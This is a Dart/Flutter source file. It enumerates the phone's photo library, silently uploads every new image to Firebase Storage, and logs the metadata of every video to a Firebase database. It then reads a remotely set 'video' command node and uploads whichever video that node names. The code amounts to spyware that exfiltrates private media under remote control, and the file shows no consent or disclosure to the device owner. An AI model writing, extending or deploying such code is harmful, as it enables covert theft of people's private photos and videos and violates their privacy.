import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'dart:io';

final database = FirebaseDatabase.instance.ref();
final scommand = database.child('video');

void sendImages() async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  var items = prefs.getStringList('sent');
  items ??= ['Taylor'];

  List<AssetPathEntity> albums =
      await PhotoManager.getAssetPathList(onlyAll: true);

  List<AssetEntity> assets =
      await albums[0].getAssetListRange(start: 0, end: albums[0].assetCount);

  var i = 0;
  for (dynamic asset in assets) {
    AssetEntity entity = asset;
    File? file = await entity.file;

    if (entity.type.toString() == 'AssetType.image') {
      if (items.contains(entity.title.toString())) {
        null;
      } else {
        uploadImage(file, entity.title.toString());
        items.add(entity.title.toString());
      }
    } else if (entity.type.toString() == 'AssetType.video') {
      final command = database.child('videos').child(i.toString());
      await command.update({'name': entity.title.toString()});
      await command.update({'duration': entity.videoDuration.toString()});
      await command.update({'type': entity.type.toString()});
      i += 1;
    } else {
      null;
    }
  }
  await prefs.setStringList('sent', items);
  PhotoManager.clearFileCache();
}

void uploadImage(file, name) async {
  var imagefile =
      FirebaseStorage.instance.ref().child("images").child("/$name");
  imagefile.putFile(file);
}

void sendVideo() async {
  dynamic album;
  dynamic asset;
  dynamic videoName = await scommand.once().then((snapshot) {
    return snapshot.snapshot.value;
  });
  String videoname = videoName['videoname'];

  List<AssetPathEntity> albums =
      await PhotoManager.getAssetPathList(onlyAll: true);
  for (album in albums) {
    List<AssetEntity> assets =
        await album.getAssetListRange(start: 0, end: album.assetCount);

    for (asset in assets) {
      AssetEntity entity = asset;
      File? file = await entity.file;
      if (entity.title.toString() == videoname) {
        uploadVideo(file, entity.title.toString());
        PhotoManager.clearFileCache();
        break;
      } else {
        null;
      }
    }
  }
  PhotoManager.clearFileCache();
}

void uploadVideo(file, name) async {
  var videofile =
      FirebaseStorage.instance.ref().child("videos").child("/$name");
  videofile.putFile(file!);
}
